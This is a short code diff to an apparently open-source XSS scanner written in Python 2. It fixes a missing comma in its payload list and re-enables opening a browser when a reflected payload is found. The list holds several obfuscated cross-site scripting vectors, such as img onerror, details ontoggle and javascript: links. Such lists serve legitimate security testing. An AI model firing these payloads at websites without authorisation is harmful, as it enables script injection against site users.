@@ -75,7 +75,7 @@ FUZZING_PAYLOADS_ATTR = [
 
 #Payloads for the striker
 vectors = [
-"\"><imG/sRc=l oNerrOr=(prompt)() x>"
+"\"><imG/sRc=l oNerrOr=(prompt)() x>",
 "<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
 "<deTails oNToggle=confi\u0072m()>",
 "<A/iD=x hREf=javascript&colon;(prompt)&lpar;1&rpar; id=x>Click</A>",
@@ -525,7 +525,7 @@ def striker():
                                     sourcecode = page.read()
                                     if x in sourcecode:
                                         print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
-                                        #webbrowser.open(data)
+                                        webbrowser.open(data)
                                         fresult.append("  Vulnerable  ")
                                         conclusion = 1
                                         total = total+1
